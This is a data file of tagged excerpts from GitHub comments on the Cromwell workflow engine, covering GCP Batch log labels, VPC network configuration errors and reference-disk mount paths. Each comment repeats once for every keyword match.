https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286969365:2,Testability,Log,Logs,2,"> Logs are seen as job progresses with the `CLOUD_LOGGING` option. Thank you @dspeck1, I was able to see cloud task logs for my ""Hello world!"" workflow in realtime when filtering for `batch_task_logs`. In production many Cromwell users scatter thousands of jobs simultaneously per project. Would it be possible to have these cloud logs labeled with workflow id / root workflow id / task / shard / attempt so users can search for logs specific to a Cromwell job? I see there are some GCP Batch job ID-based labels but I don't know how to associate these to jobs in Cromwell / WDL terms.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286969365
https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286969365:116,Testability,log,logs,116,"> Logs are seen as job progresses with the `CLOUD_LOGGING` option. Thank you @dspeck1, I was able to see cloud task logs for my ""Hello world!"" workflow in realtime when filtering for `batch_task_logs`. In production many Cromwell users scatter thousands of jobs simultaneously per project. Would it be possible to have these cloud logs labeled with workflow id / root workflow id / task / shard / attempt so users can search for logs specific to a Cromwell job? I see there are some GCP Batch job ID-based labels but I don't know how to associate these to jobs in Cromwell / WDL terms.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286969365
https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286969365:331,Testability,log,logs,331,"> Logs are seen as job progresses with the `CLOUD_LOGGING` option. Thank you @dspeck1, I was able to see cloud task logs for my ""Hello world!"" workflow in realtime when filtering for `batch_task_logs`. In production many Cromwell users scatter thousands of jobs simultaneously per project. Would it be possible to have these cloud logs labeled with workflow id / root workflow id / task / shard / attempt so users can search for logs specific to a Cromwell job? I see there are some GCP Batch job ID-based labels but I don't know how to associate these to jobs in Cromwell / WDL terms.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286969365
https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286969365:429,Testability,log,logs,429,"> Logs are seen as job progresses with the `CLOUD_LOGGING` option. Thank you @dspeck1, I was able to see cloud task logs for my ""Hello world!"" workflow in realtime when filtering for `batch_task_logs`. In production many Cromwell users scatter thousands of jobs simultaneously per project. Would it be possible to have these cloud logs labeled with workflow id / root workflow id / task / shard / attempt so users can search for logs specific to a Cromwell job? I see there are some GCP Batch job ID-based labels but I don't know how to associate these to jobs in Cromwell / WDL terms.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286969365
https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286994667:305,Availability,avail,available,305,We add the [workflow ID as a label.](https://github.com/broadinstitute/cromwell/blob/b29d8005e33aadd4e9e57178101bc3ef9d0ca9bc/supportedBackends/google/batch/src/main/scala/cromwell/backend/google/batch/api/GcpBatchRequestFactoryImpl.scala#L139) Are task and shared generated by Cromwell and would they be available from the parameters or somewhere else?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286994667
https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2287108046:307,Availability,avail,available,307,"> We add the [workflow ID as a label.](https://github.com/broadinstitute/cromwell/blob/b29d8005e33aadd4e9e57178101bc3ef9d0ca9bc/supportedBackends/google/batch/src/main/scala/cromwell/backend/google/batch/api/GcpBatchRequestFactoryImpl.scala#L139) Are task and shared generated by Cromwell and would they be available from the parameters or somewhere else?. Interesting, I'm running a local build from current `develop` and I seem to have the code you've linked above, but I don't see either the `""cromwell-workflow-id""` or `""goog-batch-worker""` labels on my task logs 🤔. . In `.labels` I have `hostname`, `job_uid`, `task_group_name`, and `task_id` keys.; In `.resource.labels` I have `job_id`, `location`, and `resource_container` keys. For the proposed additional labels, with respect to `GcpBatchRequestFactoryImpl#createAllocationPolicy`:. - Root workflow id is in `data.createParameters.jobDescriptor.workflowDescriptor.rootWorkflowId`.; - Everything else is in the `BackendJobDescriptorKey` via `data.createParameters.jobDescriptor.key`:; - task name in `call.identifier.localName` (I think); - shard in `index`; - attempt in `attempt`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2287108046
https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2287108046:563,Testability,log,logs,563,"> We add the [workflow ID as a label.](https://github.com/broadinstitute/cromwell/blob/b29d8005e33aadd4e9e57178101bc3ef9d0ca9bc/supportedBackends/google/batch/src/main/scala/cromwell/backend/google/batch/api/GcpBatchRequestFactoryImpl.scala#L139) Are task and shared generated by Cromwell and would they be available from the parameters or somewhere else?. Interesting, I'm running a local build from current `develop` and I seem to have the code you've linked above, but I don't see either the `""cromwell-workflow-id""` or `""goog-batch-worker""` labels on my task logs 🤔. . In `.labels` I have `hostname`, `job_uid`, `task_group_name`, and `task_id` keys.; In `.resource.labels` I have `job_id`, `location`, and `resource_container` keys. For the proposed additional labels, with respect to `GcpBatchRequestFactoryImpl#createAllocationPolicy`:. - Root workflow id is in `data.createParameters.jobDescriptor.workflowDescriptor.rootWorkflowId`.; - Everything else is in the `BackendJobDescriptorKey` via `data.createParameters.jobDescriptor.key`:; - task name in `call.identifier.localName` (I think); - shard in `index`; - attempt in `attempt`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2287108046
https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2287131477:49,Testability,Log,Logging,49,"Oh those labels are not propagated from Batch to Logging. Less than ideal, but you can filter with gcloud. Example below. ```; gcloud batch jobs list --location us-west2 --filter=""allocationPolicy.labels.cromwell-workflow-id=cromwell-9a2c2821-0856-49d; 3-842c-2ffccc2ca8ac""; NAME: projects/batch-testing-350715/locations/us-west2/jobs/job-480c07d3-0a83-48de-b40e-51fbca760d0b; LOCATION: us-west2; STATE: SUCCEEDED; ```; Then do a describe on the job. I will ask Google if there is something to propagate additional labels to logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2287131477
https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2287131477:296,Testability,test,testing-,296,"Oh those labels are not propagated from Batch to Logging. Less than ideal, but you can filter with gcloud. Example below. ```; gcloud batch jobs list --location us-west2 --filter=""allocationPolicy.labels.cromwell-workflow-id=cromwell-9a2c2821-0856-49d; 3-842c-2ffccc2ca8ac""; NAME: projects/batch-testing-350715/locations/us-west2/jobs/job-480c07d3-0a83-48de-b40e-51fbca760d0b; LOCATION: us-west2; STATE: SUCCEEDED; ```; Then do a describe on the job. I will ask Google if there is something to propagate additional labels to logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2287131477
https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2287131477:525,Testability,log,logs,525,"Oh those labels are not propagated from Batch to Logging. Less than ideal, but you can filter with gcloud. Example below. ```; gcloud batch jobs list --location us-west2 --filter=""allocationPolicy.labels.cromwell-workflow-id=cromwell-9a2c2821-0856-49d; 3-842c-2ffccc2ca8ac""; NAME: projects/batch-testing-350715/locations/us-west2/jobs/job-480c07d3-0a83-48de-b40e-51fbca760d0b; LOCATION: us-west2; STATE: SUCCEEDED; ```; Then do a describe on the job. I will ask Google if there is something to propagate additional labels to logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2287131477
https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2287238131:76,Testability,log,logs,76,> I will ask Google if there is something to propagate additional labels to logs. Thank you! This would be a big help in making the GCP Batch backend user-friendly at scale.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2287238131
https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2287238131:150,Usability,user-friendly,user-friendly,150,> I will ask Google if there is something to propagate additional labels to logs. Thank you! This would be a big help in making the GCP Batch backend user-friendly at scale.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2287238131
https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299768645:54,Integrability,message,message,54,Hi @yihming - thanks for providing the detail and log message. Please try removing the trailing `/` from the network url. so use `projects/gred-cumulus-sb-01-991a49c4/global/networks/vpc-cumulus-sb-01` instead.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299768645
https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299768645:50,Testability,log,log,50,Hi @yihming - thanks for providing the detail and log message. Please try removing the trailing `/` from the network url. so use `projects/gred-cumulus-sb-01-991a49c4/global/networks/vpc-cumulus-sb-01` instead.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299768645
https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299795626:312,Modifiability,config,config,312,"Hi @dspeck1 ,. Thank you for your immediate help! . I checked the `my-private-network` and `my-private-subnetwork` labels in my project (by running `gcloud projects describe` command), and neither of them has the trailing `/` (please see attached screenshot). And actually this same settings in `virtual-private-config` stanza worked with Genomics API in the past 3 years. Then recently when I migrate to GCP Batch, it broke. <img width=""387"" alt=""Screenshot 2024-08-20 at 14 21 36"" src=""https://github.com/user-attachments/assets/fed0f11d-e368-4842-80f9-3a7f99cf5b37"">",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299795626
https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299807501:179,Security,validat,validation,179,Thanks! Sorry I was looking at it incorrectly. The GCP Batch backend adds the trailing slash. The Genomics API backend added a trailing slash as well. Google must have change the validation of the format. We will push a change that fixes it. In the interim if setting the network via the literal option instead of the label should fix it.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299807501
https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299820641:864,Availability,Error,Errors,864,"Thanks! I did see the trailing `/` is added by Cromwell: https://github.com/broadinstitute/cromwell/blob/develop/supportedBackends/google/batch/src/main/scala/cromwell/backend/google/batch/models/VpcAndSubnetworkProjectLabelValues.scala#L15. I tried to set by literals as the following:. ```; virtual-private-cloud {; network-name = ""$NETWORK-NAME""; subnetwork-name = ""$SUBNETWORK-NAME""; auth = ""application-default""; }; ```; where `$NETWORK-NAME` and `$SUBNETWORK-NAME` are replaced by the values of `my-private-network` and `my-private-subnetwork` labels, and hidden here. but my server failed immediately when starting:. ```; 2024-08-20 21:43:02 main WARN - Failed to build GcpBatchConfigurationAttributes on attempt 1 of 3, retrying.; cromwell.backend.google.batch.models.GcpBatchConfigurationAttributes$$anon$1: Google Cloud Batch configuration is not valid: Errors:; Virtual Private Cloud configuration is invalid. Missing keys: `network-label-key`.; ```. It looks like the GCP Batch config requires `network-label-key`, which is not optional...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299820641
https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299820641:836,Deployability,configurat,configuration,836,"Thanks! I did see the trailing `/` is added by Cromwell: https://github.com/broadinstitute/cromwell/blob/develop/supportedBackends/google/batch/src/main/scala/cromwell/backend/google/batch/models/VpcAndSubnetworkProjectLabelValues.scala#L15. I tried to set by literals as the following:. ```; virtual-private-cloud {; network-name = ""$NETWORK-NAME""; subnetwork-name = ""$SUBNETWORK-NAME""; auth = ""application-default""; }; ```; where `$NETWORK-NAME` and `$SUBNETWORK-NAME` are replaced by the values of `my-private-network` and `my-private-subnetwork` labels, and hidden here. but my server failed immediately when starting:. ```; 2024-08-20 21:43:02 main WARN - Failed to build GcpBatchConfigurationAttributes on attempt 1 of 3, retrying.; cromwell.backend.google.batch.models.GcpBatchConfigurationAttributes$$anon$1: Google Cloud Batch configuration is not valid: Errors:; Virtual Private Cloud configuration is invalid. Missing keys: `network-label-key`.; ```. It looks like the GCP Batch config requires `network-label-key`, which is not optional...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299820641
https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299820641:895,Deployability,configurat,configuration,895,"Thanks! I did see the trailing `/` is added by Cromwell: https://github.com/broadinstitute/cromwell/blob/develop/supportedBackends/google/batch/src/main/scala/cromwell/backend/google/batch/models/VpcAndSubnetworkProjectLabelValues.scala#L15. I tried to set by literals as the following:. ```; virtual-private-cloud {; network-name = ""$NETWORK-NAME""; subnetwork-name = ""$SUBNETWORK-NAME""; auth = ""application-default""; }; ```; where `$NETWORK-NAME` and `$SUBNETWORK-NAME` are replaced by the values of `my-private-network` and `my-private-subnetwork` labels, and hidden here. but my server failed immediately when starting:. ```; 2024-08-20 21:43:02 main WARN - Failed to build GcpBatchConfigurationAttributes on attempt 1 of 3, retrying.; cromwell.backend.google.batch.models.GcpBatchConfigurationAttributes$$anon$1: Google Cloud Batch configuration is not valid: Errors:; Virtual Private Cloud configuration is invalid. Missing keys: `network-label-key`.; ```. It looks like the GCP Batch config requires `network-label-key`, which is not optional...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299820641
https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299820641:836,Modifiability,config,configuration,836,"Thanks! I did see the trailing `/` is added by Cromwell: https://github.com/broadinstitute/cromwell/blob/develop/supportedBackends/google/batch/src/main/scala/cromwell/backend/google/batch/models/VpcAndSubnetworkProjectLabelValues.scala#L15. I tried to set by literals as the following:. ```; virtual-private-cloud {; network-name = ""$NETWORK-NAME""; subnetwork-name = ""$SUBNETWORK-NAME""; auth = ""application-default""; }; ```; where `$NETWORK-NAME` and `$SUBNETWORK-NAME` are replaced by the values of `my-private-network` and `my-private-subnetwork` labels, and hidden here. but my server failed immediately when starting:. ```; 2024-08-20 21:43:02 main WARN - Failed to build GcpBatchConfigurationAttributes on attempt 1 of 3, retrying.; cromwell.backend.google.batch.models.GcpBatchConfigurationAttributes$$anon$1: Google Cloud Batch configuration is not valid: Errors:; Virtual Private Cloud configuration is invalid. Missing keys: `network-label-key`.; ```. It looks like the GCP Batch config requires `network-label-key`, which is not optional...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299820641
https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299820641:895,Modifiability,config,configuration,895,"Thanks! I did see the trailing `/` is added by Cromwell: https://github.com/broadinstitute/cromwell/blob/develop/supportedBackends/google/batch/src/main/scala/cromwell/backend/google/batch/models/VpcAndSubnetworkProjectLabelValues.scala#L15. I tried to set by literals as the following:. ```; virtual-private-cloud {; network-name = ""$NETWORK-NAME""; subnetwork-name = ""$SUBNETWORK-NAME""; auth = ""application-default""; }; ```; where `$NETWORK-NAME` and `$SUBNETWORK-NAME` are replaced by the values of `my-private-network` and `my-private-subnetwork` labels, and hidden here. but my server failed immediately when starting:. ```; 2024-08-20 21:43:02 main WARN - Failed to build GcpBatchConfigurationAttributes on attempt 1 of 3, retrying.; cromwell.backend.google.batch.models.GcpBatchConfigurationAttributes$$anon$1: Google Cloud Batch configuration is not valid: Errors:; Virtual Private Cloud configuration is invalid. Missing keys: `network-label-key`.; ```. It looks like the GCP Batch config requires `network-label-key`, which is not optional...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299820641
https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299820641:990,Modifiability,config,config,990,"Thanks! I did see the trailing `/` is added by Cromwell: https://github.com/broadinstitute/cromwell/blob/develop/supportedBackends/google/batch/src/main/scala/cromwell/backend/google/batch/models/VpcAndSubnetworkProjectLabelValues.scala#L15. I tried to set by literals as the following:. ```; virtual-private-cloud {; network-name = ""$NETWORK-NAME""; subnetwork-name = ""$SUBNETWORK-NAME""; auth = ""application-default""; }; ```; where `$NETWORK-NAME` and `$SUBNETWORK-NAME` are replaced by the values of `my-private-network` and `my-private-subnetwork` labels, and hidden here. but my server failed immediately when starting:. ```; 2024-08-20 21:43:02 main WARN - Failed to build GcpBatchConfigurationAttributes on attempt 1 of 3, retrying.; cromwell.backend.google.batch.models.GcpBatchConfigurationAttributes$$anon$1: Google Cloud Batch configuration is not valid: Errors:; Virtual Private Cloud configuration is invalid. Missing keys: `network-label-key`.; ```. It looks like the GCP Batch config requires `network-label-key`, which is not optional...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299820641
https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2302694224:87,Deployability,update,update,87,We are working on updating the code to fix the bugs describe above and will provide an update when complete.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2302694224
https://github.com/broadinstitute/cromwell/pull/7501#issuecomment-2302802927:371,Energy Efficiency,allocate,allocate,371,"> Have you thought about where you'd like to place the conversion from ""quota timestamp is recent"" to Boolean ""quota is exhausted""?. @aednichols I was thinking probably in the `/database/slick/GroupMetricsSlickDatabase.scala` file or maybe 1 level higher. But yeah that will be included in the next PR which will actually use the values from the table to decide where to allocate new tokens to this group or not.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7501#issuecomment-2302802927
https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2338931484:56,Availability,Error,Error,56,"With the current code I see in the logs:. ```; ""docker: Error response from daemon: error while creating mount source path '/mnt/11a4324d4472f639f3fc558b00afeacd': mkdir /mnt/11a4324d4472f639f3fc558b00afeacd: read-only file system.""; ```. and in the job metadata the following. Note the lack of `ro` specifiers in the docker command line invocation, and the presence of `ro` specifiers in the `volumes`:. ```; ""container"": {; ""commands"": [; ""-c"",; ""printf '%s %s\\n' \""$(date -u '+%Y/%m/%d %H:%M:%S')\"" Running\\ user\\ runnable:\\ docker\\ run\\ -v\\ /mnt/disks/cromwell_root:/mnt/disks/cromwell_root\\ -v\\ /mnt/11a4324d4472f639f3fc558b00afeacd:/mnt/11a4324d4472f639f3fc558b00afeacd\\ -v\\ /mnt/d9e025138b28caa42dd4006fc3636661:/mnt/d9e025138b28caa42dd4006fc3636661\\ --entrypoint\\=/bin/bash\\ ubuntu@sha256:8a37d68f4f73ebf3d4efafbcf66379bf3728902a8038616808f04e34a9ab63ee\\ /mnt/disks/cromwell_root/script""; ],; ""entrypoint"": ""/bin/sh"",; ""imageUri"": ""gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine"",; ""volumes"": [; ""/mnt/disks/cromwell_root:/mnt/disks/cromwell_root:rw"",; ""/mnt/11a4324d4472f639f3fc558b00afeacd:/mnt/11a4324d4472f639f3fc558b00afeacd:ro"",; ""/mnt/d9e025138b28caa42dd4006fc3636661:/mnt/d9e025138b28caa42dd4006fc3636661:ro""; ]; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2338931484
https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2338931484:84,Availability,error,error,84,"With the current code I see in the logs:. ```; ""docker: Error response from daemon: error while creating mount source path '/mnt/11a4324d4472f639f3fc558b00afeacd': mkdir /mnt/11a4324d4472f639f3fc558b00afeacd: read-only file system.""; ```. and in the job metadata the following. Note the lack of `ro` specifiers in the docker command line invocation, and the presence of `ro` specifiers in the `volumes`:. ```; ""container"": {; ""commands"": [; ""-c"",; ""printf '%s %s\\n' \""$(date -u '+%Y/%m/%d %H:%M:%S')\"" Running\\ user\\ runnable:\\ docker\\ run\\ -v\\ /mnt/disks/cromwell_root:/mnt/disks/cromwell_root\\ -v\\ /mnt/11a4324d4472f639f3fc558b00afeacd:/mnt/11a4324d4472f639f3fc558b00afeacd\\ -v\\ /mnt/d9e025138b28caa42dd4006fc3636661:/mnt/d9e025138b28caa42dd4006fc3636661\\ --entrypoint\\=/bin/bash\\ ubuntu@sha256:8a37d68f4f73ebf3d4efafbcf66379bf3728902a8038616808f04e34a9ab63ee\\ /mnt/disks/cromwell_root/script""; ],; ""entrypoint"": ""/bin/sh"",; ""imageUri"": ""gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine"",; ""volumes"": [; ""/mnt/disks/cromwell_root:/mnt/disks/cromwell_root:rw"",; ""/mnt/11a4324d4472f639f3fc558b00afeacd:/mnt/11a4324d4472f639f3fc558b00afeacd:ro"",; ""/mnt/d9e025138b28caa42dd4006fc3636661:/mnt/d9e025138b28caa42dd4006fc3636661:ro""; ]; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2338931484
https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2338931484:35,Testability,log,logs,35,"With the current code I see in the logs:. ```; ""docker: Error response from daemon: error while creating mount source path '/mnt/11a4324d4472f639f3fc558b00afeacd': mkdir /mnt/11a4324d4472f639f3fc558b00afeacd: read-only file system.""; ```. and in the job metadata the following. Note the lack of `ro` specifiers in the docker command line invocation, and the presence of `ro` specifiers in the `volumes`:. ```; ""container"": {; ""commands"": [; ""-c"",; ""printf '%s %s\\n' \""$(date -u '+%Y/%m/%d %H:%M:%S')\"" Running\\ user\\ runnable:\\ docker\\ run\\ -v\\ /mnt/disks/cromwell_root:/mnt/disks/cromwell_root\\ -v\\ /mnt/11a4324d4472f639f3fc558b00afeacd:/mnt/11a4324d4472f639f3fc558b00afeacd\\ -v\\ /mnt/d9e025138b28caa42dd4006fc3636661:/mnt/d9e025138b28caa42dd4006fc3636661\\ --entrypoint\\=/bin/bash\\ ubuntu@sha256:8a37d68f4f73ebf3d4efafbcf66379bf3728902a8038616808f04e34a9ab63ee\\ /mnt/disks/cromwell_root/script""; ],; ""entrypoint"": ""/bin/sh"",; ""imageUri"": ""gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine"",; ""volumes"": [; ""/mnt/disks/cromwell_root:/mnt/disks/cromwell_root:rw"",; ""/mnt/11a4324d4472f639f3fc558b00afeacd:/mnt/11a4324d4472f639f3fc558b00afeacd:ro"",; ""/mnt/d9e025138b28caa42dd4006fc3636661:/mnt/d9e025138b28caa42dd4006fc3636661:ro""; ]; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2338931484
https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2338954221:164,Deployability,update,update,164,Thanks! I was just about to ask you for the logs from GCP. Looks like the issue is the mount path. Batch only allows mounting to specific locations. I will push an update to the mount path.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2338954221
https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2338954221:44,Testability,log,logs,44,Thanks! I was just about to ask you for the logs from GCP. Looks like the issue is the mount path. Batch only allows mounting to specific locations. I will push an update to the mount path.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2338954221
https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2339019036:31,Testability,test,test,31,That did the trick for the one test currently in the PR! There are a few other PAPI v2 reference disk tests for which I'll make GCP Batch versions and add those here.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2339019036
https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2339019036:102,Testability,test,tests,102,That did the trick for the one test currently in the PR! There are a few other PAPI v2 reference disk tests for which I'll make GCP Batch versions and add those here.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2339019036
https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2374057358:76,Modifiability,config,config,76,"Question: Is including reference-disk-localization manifest in the cromwell.config out of date when using GCPBatch as the backend? Should this just instead point to a separate config file? For example `include ""papi_v2_reference_image_manifest.conf""` in the config file instead?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2374057358
https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2374057358:176,Modifiability,config,config,176,"Question: Is including reference-disk-localization manifest in the cromwell.config out of date when using GCPBatch as the backend? Should this just instead point to a separate config file? For example `include ""papi_v2_reference_image_manifest.conf""` in the config file instead?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2374057358
https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2374057358:258,Modifiability,config,config,258,"Question: Is including reference-disk-localization manifest in the cromwell.config out of date when using GCPBatch as the backend? Should this just instead point to a separate config file? For example `include ""papi_v2_reference_image_manifest.conf""` in the config file instead?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2374057358
https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2375382005:69,Deployability,configurat,configuration,69,"@jbakerpmc there have been no changes to reference disk localization configuration between GCP Batch and PAPI v2 beta that I'm aware of. You can `include` if you prefer to keep reference disk config in a separate file, or just inline to your main config if you prefer.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2375382005
https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2375382005:69,Modifiability,config,configuration,69,"@jbakerpmc there have been no changes to reference disk localization configuration between GCP Batch and PAPI v2 beta that I'm aware of. You can `include` if you prefer to keep reference disk config in a separate file, or just inline to your main config if you prefer.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2375382005
https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2375382005:192,Modifiability,config,config,192,"@jbakerpmc there have been no changes to reference disk localization configuration between GCP Batch and PAPI v2 beta that I'm aware of. You can `include` if you prefer to keep reference disk config in a separate file, or just inline to your main config if you prefer.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2375382005
https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2375382005:247,Modifiability,config,config,247,"@jbakerpmc there have been no changes to reference disk localization configuration between GCP Batch and PAPI v2 beta that I'm aware of. You can `include` if you prefer to keep reference disk config in a separate file, or just inline to your main config if you prefer.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2375382005
https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2376149124:419,Availability,Error,Error,419,"@mcovarr Thanks for your response. The documentation can be somewhat unclear. I've updated the localization and have kept this inline with my main config for GCP Batch. I am using Cromwell v87. However, while running a job, I’m encountering issues when Cromwell is attempting to mount my files to a local mount. I have been monitoring the VM and job, it seems Cromwell is unsure of how to handle this: For instance:. **Error 1:**; ```; severity: ""DEFAULT""; textPayload: ""umount: /mnt/2d49bcb009113835140d638a10b535af: no mount point specified.""; timestamp: ""2024-09-26T14:07:54.88114; ```. **Error 2:**; ```; severity: ""ERROR""; textPayload: ""Copying gs://test-cromwell-genomics-resources/references/hg38/v0/Homo_sapiens_assembly38.fasta.fai to file:///mnt/disks/cromwell_root/test-cromwell-genomics-resources/references/hg38/v0/Homo_sapiens_assembly38.fasta.fai""; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2376149124
